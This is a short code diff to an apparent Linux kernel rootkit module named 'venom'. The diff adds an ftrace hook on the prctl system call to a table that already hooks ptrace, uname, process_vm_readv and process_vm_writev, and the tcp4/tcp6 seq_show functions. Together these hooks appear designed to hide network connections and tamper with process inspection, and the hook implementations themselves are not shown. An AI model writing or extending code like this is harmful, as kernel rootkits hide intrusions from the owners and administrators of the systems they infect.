@@ -22,6 +22,7 @@
 #include "hooks/ptrace.h" 
 #include "hooks/uname.h" 
 #include "hooks/process_vm.h"
+#include "hooks/prctl.h" 
 
 
 
@@ -90,7 +91,8 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_ptrace", hooked_ptrace, &orig_ptrace), 
     HOOK("__x64_sys_uname", trev_uname, &orig_uname), 
     HOOK("__x64_sys_process_vm_readv", hacked_process_vm_readv, &orig_process_vm_readv),
-    HOOK("__x64_sys_process_vm_writev", hacked_process_vm_writev, &orig_process_vm_writev),
+    HOOK("__x64_sys_process_vm_writev", hacked_process_vm_writev, &orig_process_vm_writev), 
+    HOOK("__x64_sys_prctl", hacked_prctl, &orig_prctl), 
 
     HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
@@ -162,6 +164,7 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
 
 
